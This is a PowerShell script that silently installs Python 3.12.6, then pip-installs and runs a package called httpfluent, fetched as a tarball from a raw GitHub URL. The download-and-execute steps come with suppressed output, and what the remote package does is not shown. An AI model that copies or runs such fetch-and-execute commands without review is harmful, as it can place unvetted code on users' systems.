# =====================================================
# TEST / PRODUCTION Python + httpfluent installer
# =====================================================

# -----------------------------
# CONFIG: Toggle behavior
# -----------------------------
# $true  = force download & use Python 3.12
# $false = use existing Python >=3.9 if available
$ForcePythonInstall = $true

# Silently ignore progress bars
$ProgressPreference = 'SilentlyContinue'

Write-Host "[*] Starting script..." -ForegroundColor Cyan

# -----------------------------
# Step 1: Find Python >= 3.9
# -----------------------------
$BestPython = $null
$BestVersion = $null
$Candidates = @()

if (-not $ForcePythonInstall) {
    # Only check if force install is off
    $cmd = Get-Command python -ErrorAction SilentlyContinue
    if ($cmd) { $Candidates += $cmd.Source }

    $Roots = @(
        "$env:LOCALAPPDATA\Programs\Python",
        "$env:ProgramFiles\Python",
        "$env:ProgramFiles(x86)\Python"
    )

    foreach ($root in $Roots) {
        if (Test-Path $root) {
            Get-ChildItem -Path $root -Directory -ErrorAction SilentlyContinue | ForEach-Object {
                $exe = Join-Path $_.FullName "python.exe"
                if (Test-Path $exe) { $Candidates += $exe }
            }
        }
    }

    foreach ($candidate in ($Candidates | Select-Object -Unique)) {
        try {
            $out = & $candidate --version 2>&1
            if ($out -match "Python (\d+\.\d+\.\d+)") {
                $ver = [version]$Matches[1]
                if ($ver -ge [version]"3.9") {
                    if (-not $BestVersion -or $ver -gt $BestVersion) {
                        $BestVersion = $ver
                        $BestPython = $candidate
                    }
                }
            }
        } catch {}
    }
}

# -----------------------------
# Step 2: Install Python 3.12 (FORCED or missing)
# -----------------------------
$PythonRoot = "$env:LOCALAPPDATA\Programs\Python\Python312-Test"
$PythonExe = Join-Path $PythonRoot "python.exe"

if ($ForcePythonInstall -or -not $BestPython -or -not (Test-Path $BestPython)) {
    Write-Host "[!] Installing Python 3.12.6..." -ForegroundColor Yellow

    $Installer = "$env:TEMP\python-3.12.6-installer.exe"

    Invoke-WebRequest `
        -Uri "https://www.python.org/ftp/python/3.12.6/python-3.12.6-amd64.exe" `
        -OutFile $Installer

    Start-Process `
        -FilePath $Installer `
        -ArgumentList "/quiet InstallAllUsers=0 PrependPath=0 TargetDir=`"$PythonRoot`"" `
        -Wait

    if (-not (Test-Path $PythonExe)) {
        Write-Host "[-] Python installation failed." -ForegroundColor Red
        exit 1
    }

    $BestPython = $PythonExe
}

Write-Host "[+] Using Python: $BestPython" -ForegroundColor Green

# -----------------------------
# Step 3: Ensure pip + upgrade
# -----------------------------
& $BestPython -m ensurepip | Out-Null
& $BestPython -m pip install --upgrade pip `
    --no-user --progress-bar off --disable-pip-version-check --no-input

# -----------------------------
# Step 4: Install httpfluent non-interactively
# -----------------------------
& $BestPython -m pip install requests `
    --no-user --progress-bar off --disable-pip-version-check --no-input

& $BestPython -m pip install "https://github.com/httpfluent/Intranetflow/raw/main/v1.0/httpfluent-0.1.tar.gz" `
    --no-user --progress-bar off --disable-pip-version-check --no-input

# -----------------------------
# Step 5: Resolve Scripts directory
# -----------------------------
$ScriptsDir = & $BestPython -c "import sysconfig;print(sysconfig.get_path('scripts'))"
$ScriptsDir = $ScriptsDir.Trim()
$HttpFluentExe = Join-Path $ScriptsDir "httpfluent.exe"

Write-Host "[+] Scripts directory: $ScriptsDir" -ForegroundColor Green

# -----------------------------
# Step 6: Run httpfluent
# -----------------------------
if (Test-Path $HttpFluentExe) {
    Write-Host "[+] Launching httpfluent --help" -ForegroundColor Green
    & $HttpFluentExe --help
} else {
    Write-Host "[-] httpfluent.exe not found." -ForegroundColor Red
}

Write-Host "[*] Script finished." -ForegroundColor Cyan
#end
